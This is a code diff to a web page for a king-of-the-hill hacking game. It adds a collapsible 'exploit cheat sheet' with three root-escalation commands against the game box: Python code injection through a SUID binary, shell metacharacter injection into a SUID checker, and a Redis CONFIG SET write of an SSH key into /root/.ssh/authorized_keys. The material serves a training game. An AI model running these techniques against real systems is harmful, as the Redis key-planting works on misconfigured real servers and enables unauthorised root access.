@@ -209,6 +209,56 @@ export default async function KothPage({
             Once inside: get root via the SUID paths or Redis, then
             <code className="ml-1">crown-claim koth{myKey.slot} &lt;exploit&gt;</code> to claim the throne.
           </p>
+
+          {/* Exploit cheat sheet — collapsible, native <details>, no JS */}
+          <details className="text-[12px] font-mono pt-1.5 border-t border-green/20 mt-2">
+            <summary className="cursor-pointer text-amber hover:text-amber/80 select-none py-1 tracking-wider">
+              ▸ exploit cheat sheet · open at your own risk
+            </summary>
+            <div className="space-y-3 pt-2 pb-1">
+              <div className="space-y-1">
+                <div className="text-[10px] text-amber/70 uppercase tracking-widest">
+                  L7 — phantom-python3 SUID · argv code injection
+                </div>
+                <pre className="text-[11px] text-text bg-amber/[0.04] border border-amber/20 px-2 py-1.5 overflow-x-auto">
+{`/usr/local/bin/phantom-python3 -c \\
+  'import os; os.system("crown-claim koth${myKey.slot} l7-suid")'`}
+                </pre>
+              </div>
+              <div className="space-y-1">
+                <div className="text-[10px] text-amber/70 uppercase tracking-widest">
+                  L8 — system-checker SUID · shell metachar injection
+                </div>
+                <pre className="text-[11px] text-text bg-amber/[0.04] border border-amber/20 px-2 py-1.5 overflow-x-auto">
+{`/usr/local/bin/system-checker \\
+  '127.0.0.1; crown-claim koth${myKey.slot} l8-suid'`}
+                </pre>
+              </div>
+              <div className="space-y-1">
+                <div className="text-[10px] text-amber/70 uppercase tracking-widest">
+                  L17 — Redis CONFIG SET · write to /root/.ssh/authorized_keys
+                </div>
+                <pre className="text-[11px] text-text bg-amber/[0.04] border border-amber/20 px-2 py-1.5 overflow-x-auto whitespace-pre">
+{`ssh-keygen -t ed25519 -f /tmp/k -N ''
+KEY=$(cat /tmp/k.pub)
+redis-cli <<EOF
+CONFIG SET dir /root/.ssh
+CONFIG SET dbfilename authorized_keys
+SET x "\\n\\n$KEY\\n\\n"
+SAVE
+EOF
+ssh -i /tmp/k -o StrictHostKeyChecking=no root@localhost \\
+  "crown-claim koth${myKey.slot} l17-redis"`}
+                </pre>
+              </div>
+              <p className="text-[10px] text-muted leading-snug pt-1">
+                These work today. The box mutates against playbooks — defenders
+                close paths after they're used. Real opsec means reading
+                <code className="mx-1">/var/log/auth.log</code>
+                and adapting in real time, not copy-paste forever.
+              </p>
+            </div>
+          </details>
         </section>
       ) : (
         <section className="border border-amber/40 bg-amber/[0.03] px-4 py-3 space-y-3">
